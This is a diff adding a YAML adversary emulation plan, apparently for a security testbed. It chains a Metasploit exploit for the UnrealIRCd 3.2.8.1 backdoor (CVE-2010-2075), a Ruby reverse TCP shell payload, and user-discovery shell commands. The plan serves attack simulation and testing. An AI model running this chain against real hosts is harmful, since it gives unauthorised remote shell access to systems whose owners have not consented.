@@ -1,0 +1,97 @@
+emulation_plan_details:
+  adversary_name: test
+  creation_time: 2025-04-10 23:31:44 UTC+0000
+attack_action_sequence:
+  - uuid: 03a4b465-a3c7-403a-9004-d454a344dd30
+    name: UnrealIRCD 3.2.8.1 Backdoor Command Execution
+    id:
+      - T1203
+    source: Metasploit Exploit
+    supported_platforms:
+      - Unix
+    tactics:
+      - Execution
+    technique:
+      - Exploitation for Client Execution
+    description: This module exploits a malicious backdoor that was added to the Unreal
+      IRCD 3.2.8.1 download archive. This backdoor was present in the Unreal3.2.8.1.tar.gz
+      archive between November 2009 and June 12th 2010.
+    testbed:
+      CVE:
+        - CVE-2010-2075
+    execution:
+      executor: Metasploit Executor
+      command: set_exploit_module("unix/irc/unreal_ircd_3281_backdoor")
+    arguments:
+      RHOSTS:
+        CurrentSetting: ''
+        Required: true
+        Description: The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+      RPORT:
+        CurrentSetting: 6667
+        Required: true
+        Description: The target port
+      SSLVersion:
+        CurrentSetting: Auto
+        Required: true
+        Description: 'Specify the version of SSL/TLS to be used (Auto, TLS and SSL23
+          are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3, TLS1, TLS1.1, TLS1.2)'
+      ConnectTimeout:
+        CurrentSetting: 10
+        Required: true
+        Description: Maximum number of seconds to establish a TCP connection
+  - uuid: 2d8e7dd5-5f1d-4364-b90e-d855118460e0
+    name: Unix Command Shell, Reverse TCP (via Ruby)
+    id:
+      - T1059
+      - T1105
+    source: Metasploit Payload
+    supported_platforms:
+      - Unix
+    tactics:
+      - Execution
+      - Command and Control
+    technique:
+      - Command and Scripting Interpreter
+      - Ingress Tool Transfer
+    description: Connect back and create a command shell via Ruby
+    execution:
+      executor: Metasploit Executor
+      command: set_payload_module("cmd/unix/reverse_ruby")
+    arguments:
+      LHOST:
+        CurrentSetting: ''
+        Required: true
+        Description: The listen address (an interface may be specified)
+      LPORT:
+        CurrentSetting: '4444'
+        Required: true
+        Description: The listen port
+  - uuid: 2a9b677d-a230-44f4-ad86-782df1ef108c
+    name: System Owner/User Discovery
+    id:
+      - T1033
+    source: ART
+    supported_platforms:
+      - linux
+      - macos
+    tactics:
+      - Discovery
+    technique:
+      - System Owner/User Discovery
+    description: |
+      Identify System owner or users on an endpoint
+
+      Upon successful execution, sh will stdout list of usernames.
+    execution:
+      executor: Shell Executor
+      command: |
+        users
+        w
+        who
+    arguments:
+    dependencies:
+testbed_requirement:
+  OS: []
+  CVE:
+    - CVE-2010-2075
